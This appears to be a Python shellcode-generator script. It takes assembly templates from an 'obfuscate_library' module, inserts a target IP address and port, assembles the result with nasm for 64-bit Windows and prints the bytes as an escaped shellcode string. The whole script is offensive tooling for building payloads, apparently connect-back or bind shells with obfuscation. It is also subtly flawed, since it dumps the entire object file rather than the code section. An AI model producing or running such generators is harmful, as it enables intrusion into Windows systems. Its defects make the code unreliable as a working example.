#!/usr/bin/env python

import subprocess
import struct

try:
    from obfuscate_library import assembly
except ImportError:
    print("[-] Something went wrong while trying to \
        import assembly from obfuscate_library")
    quit(0)

class Gen_sc:
    def __init__(self):
        self.unmodified_asm = None
        self.modified_asm = None
        self.shellcode = None

        self.replace_data = {
            "<ip_address>" : "192.168.0.1",
            "<0>" : "192",
            "<1>" : "168",
            "<2>" : "0",
            "<3>" : "1",
            "<port>" : "1337"
        }
    
    def grab_asm_c(self):
        for k_type, v_type in assembly.items():
            for k_plat, v_plat in v_type.items():
                for k_ver, asm_c in v_plat.items():
                    self.unmodified_asm = asm_c

    def modify_asm_c(self):
        for old, new in self.replace_data.items():
            self.unmodified_asm = self.unmodified_asm.replace(old, new)
            self.modified_asm = self.unmodified_asm.replace(old, new)

    def create_asm_file(self):
        with open("shellcode.asm", 'w') as f:
            f.write(self.modified_asm)

    def init_nasm(self, sc_file, target_platform):
        command = "nasm -f win64 shellcode.asm -o shellcode.o"
        subprocess.run(command, shell=True)
    
    def extract_sc(self):
        with open("shellcode.o", 'rb') as f:
            machine_code = f.read()
        self.shellcode = '\\x' + '\\x'.join(format(byte, '02x') for byte in machine_code)

    def output_sc(self):
        print(self.shellcode)

def init_gen_sc():
    gen_sc = Gen_sc()

    gen_sc.grab_asm_c()
    gen_sc.modify_asm_c()

    gen_sc.create_asm_file()
    gen_sc.init_nasm(None, None)

    gen_sc.extract_sc()
    gen_sc.output_sc()



    #gen_sc.init_nasm(None, None)

if __name__ == '__main__':
    init_gen_sc()
